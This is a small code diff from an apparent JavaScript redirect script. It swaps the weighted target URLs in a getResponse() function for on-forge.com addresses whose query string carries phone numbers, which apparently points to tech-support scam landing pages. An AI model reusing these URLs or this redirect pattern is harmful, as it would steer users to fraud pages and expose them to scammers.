@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://10-fgdxhgfxj.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 },
-        { url: "https://10-fgdxhgfxj.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 }
+        { url: "https://Velvora.on-forge.com/werrx01USAHTML/?bcda=800 852 3109", weight: 0.5 },
+        { url: "https://Velvora.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
       
     ];
 
